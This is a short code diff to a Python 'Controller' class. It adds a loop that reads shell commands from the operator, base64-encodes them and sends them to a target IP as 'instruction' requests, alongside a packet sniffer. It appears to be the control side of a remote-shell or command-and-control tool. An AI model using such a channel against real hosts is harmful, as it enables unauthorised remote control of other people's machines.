@@ -46,6 +46,10 @@ class Controller(Host):
 
         sniffer = Process(target=self.sniffing, args=(target['ip'],))
         sniffer.start()
+
+        while True:
+            cmd = input("shell: ").encode()
+            self.send(target['ip'], "instruction", "request", base64.b64encode(cmd))
         # print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")
 
     
